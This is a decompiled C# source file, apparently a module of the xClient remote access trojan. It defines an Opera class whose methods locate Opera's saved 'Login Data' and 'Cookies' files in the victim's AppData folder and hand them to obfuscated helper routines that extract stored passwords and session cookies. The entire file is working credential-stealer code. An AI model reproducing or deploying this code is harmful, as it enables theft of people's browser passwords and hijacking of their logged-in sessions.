using System;
using System.Collections.Generic;
using System.IO;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000D1 RID: 209
	public class Opera
	{
		// Token: 0x06000536 RID: 1334 RVA: 0x00012A24 File Offset: 0x00010C24
		public static List<GClass32> GetSavedPasswords()
		{
			List<GClass32> result;
			try
			{
				string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Login Data");
				result = GClass29.smethod_0(datapath, "Opera");
			}
			catch (Exception)
			{
				result = new List<GClass32>();
			}
			return result;
		}

		// Token: 0x06000537 RID: 1335 RVA: 0x00012A6C File Offset: 0x00010C6C
		public static List<GClass29.GClass30> GetSavedCookies()
		{
			List<GClass29.GClass30> result;
			try
			{
				string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Cookies");
				result = GClass29.smethod_1(dataPath, "Opera");
			}
			catch (Exception)
			{
				result = new List<GClass29.GClass30>();
			}
			return result;
		}
	}
}
